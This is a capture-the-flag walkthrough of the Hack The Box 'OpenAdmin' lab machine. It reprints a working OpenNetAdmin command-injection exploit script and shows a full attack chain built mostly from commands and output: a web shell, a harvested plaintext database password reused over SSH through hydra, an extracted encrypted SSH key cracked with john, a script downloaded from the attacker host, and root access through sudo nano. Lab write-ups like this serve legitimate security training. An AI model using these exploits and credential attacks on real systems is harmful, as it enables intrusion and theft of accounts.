# OpenAdmin
https://app.hackthebox.com/machines/222

Target IP
10.10.10.171

## Enumeration
---

First lets start with [AutoRecon](https://github.com/Tib3rius/AutoRecon).
```
sudo $(which autorecon) 10.10.10.171 --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### Nmap


- 22/tcp - ssh
- 80/tcp - http


### Burp


### OpenNetAdmin

![](images/htb-openadmin-opennetadmin-version.png)

```
$ searchsploit OpenNetAdmin
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                              | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                               | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                | php/webapps/47691.sh
------------------------------------------------------------------------------------------- ---------------------------------
```

```
$ searchsploit -m php/webapps/47691.sh
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
File Type: ASCII text

Copied to: /home/kali/Desktop/HTB/OpenAdmin/47691.sh
```

- `47691.sh`
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```


```
$ bash 47691.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

```
$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

```
$ cat users.txt    
root
jimmy
mysql
joanna 
```

```
$ cat passwords.txt 
n1nj4W4rri0R!
```


```
$ hydra -L users.txt -P passwords.txt ssh://10.10.10.171 -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak
...
[DATA] attacking ssh://10.10.10.171:22/
[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
1 of 1 target successfully completed, 1 valid password found
...
```



```
$ ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: n1nj4W4rri0R!
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 29 06:35:11 UTC 2022

  System load:  0.05              Processes:             196
  Usage of /:   32.1% of 7.81GB   Users logged in:       0
  Memory usage: 19%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Oct 29 06:22:20 2022 from 10.10.14.14
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

- netstat - extra ports
```
jimmy@openadmin:~$ netstat -pnlt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

- high port `52846` is http 
```
jimmy@openadmin:~$ echo "QUIT" | nc 127.0.0.1 52846
HTTP/1.1 400 Bad Request
Date: Sat, 29 Oct 2022 07:51:12 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 314
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at internal.openadmin.htb Port 80</address>
</body></html>
```
apache - `internal.openadmin.htb` ??


- Apache config
```
jimmy@openadmin:~$ ls -lha /etc/apache2/sites-enabled/
total 8.0K
drwxr-xr-x 2 root root 4.0K Nov 22  2019 .
drwxr-xr-x 8 root root 4.0K Nov 21  2019 ..
lrwxrwxrwx 1 root root   32 Nov 22  2019 internal.conf -> ../sites-available/internal.conf
lrwxrwxrwx 1 root root   33 Nov 22  2019 openadmin.conf -> ../sites-available/openadmin.conf
```

```
jimmy@openadmin:~$ cat /etc/apache2/sites-available/openadmin.conf | grep -v '^[[:space:]]*$' | grep -v '#'
<VirtualHost *:80>
        ServerName openadmin.htb
        ServerAdmin jimmy@openadmin.htb
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

```
jimmy@openadmin:~$ cat /etc/apache2/sites-available/internal.conf | grep -v '^[[:space:]]*$' | grep -v '#'
Listen 127.0.0.1:52846
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```


- other site dir
```
jimmy@openadmin:~$ ls -lha /var/www/internal
total 20K
drwxrwx--- 2 jimmy internal 4.0K Nov 23  2019 .
drwxr-xr-x 4 root  root     4.0K Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3.2K Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

- curl other site
```
jimmy@openadmin:~$ cat /var/www/internal/main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

- get joanna's rsa id
```
jimmy@openadmin:~$ curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
...
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

- ssh with it ask for a passphrase 
```
$ ssh -i joanna_id_rsa joanna@10.10.10.171 
Enter passphrase for key 'joanna_id_rsa': 
```

- use ssh2john to get a hash
```
$ ssh2john joanna_id_rsa                  
joanna_id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d146...add9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d
```


- use john to crack the hash

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt joanna_passphrase.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_id_rsa)     
1g 0:00:00:04 DONE (2022-10-29 00:24) 0.2358g/s 2258Kp/s 2258Kc/s 2258KC/s bloodofyouth..bloodmabite
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


```
$ ssh -i joanna_id_rsa joanna@10.10.10.171
Enter passphrase for key 'joanna_id_rsa': bloodninjas
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 29 07:57:06 UTC 2022

  System load:  0.0               Processes:             181
  Usage of /:   32.7% of 7.81GB   Users logged in:       1
  Memory usage: 20%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

```
joanna@openadmin:~$ cat /home/joanna/user.txt
36b3************************885f
```

```
$ cd /opt/linux_privesc                                                             
sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```
joanna@openadmin:~$ wget http://10.10.14.14/lse.sh
--2022-10-29 08:47:18--  http://10.10.14.14/lse.sh
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 53217 (52K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh                     100%[=====================================>]  51.97K   331KB/s    in 0.2s    

2022-10-29 08:47:19 (331 KB/s) - ‘lse.sh’ saved [53217/53217]
```



```
joanna@openadmin:~$ bash lse.sh 
---
If you know the current user password, write it here to check sudo privileges: 
---

 LSE Version: 4.10nw

        User: joanna
     User ID: 1001
    Password: none
        Home: /home/joanna
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
       umask: 0002

    Hostname: openadmin
       Linux: 4.15.0-70-generic
Distribution: Ubuntu 18.04.3 LTS
Architecture: x86_64

=====================( Current Output Verbosity Level: 0 )======================
...
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
---
[*] sud040 Can we read sudoers files?...................................... yes!
[*] sud050 Do we know if any other users used sudo?........................ nope
...
```

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

- [gtfobins - nano - sudo](https://gtfobins.github.io/gtfobins/nano/#sudo)
- [Privilege Escalation Tricks with Nano](https://www.youtube.com/watch?v=R1nOnjGyL-k&t=2s)


```
# pwd 
/home/joanna

# ls -lha /root
total 36K
drwx------  6 root root 4.0K Aug 17  2021 .
drwxr-xr-x 24 root root 4.0K Aug 17  2021 ..
lrwxrwxrwx  1 root root    9 Nov 21  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Aug 17  2021 .cache
drwx------  3 root root 4.0K Nov 21  2019 .gnupg
drwxr-xr-x  3 root root 4.0K Aug 17  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Oct 29 04:40 root.txt
drwx------  2 root root 4.0K Nov 21  2019 .ssh

# cat /root/root.txt
35db************************c17f
```


